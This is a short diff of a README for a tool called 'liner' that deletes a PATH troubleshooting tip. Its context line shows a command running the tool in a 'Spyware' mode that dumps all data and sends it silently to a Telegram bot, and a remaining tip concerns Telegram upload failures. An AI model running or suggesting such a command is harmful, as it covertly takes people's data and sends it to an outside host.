@@ -106,13 +106,6 @@ sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
 
 ## ⚙️ Troubleshooting
 
-- `liner` not found?  
-  Make sure `~/go/bin` is in `$PATH`.
-
-```bash
-echo $PATH
-```
-
 - Telegram upload fails with `429 Too Many Requests` or timeout?  
   Check your connection or reduce concurrency in `core/telegram.go`.
 
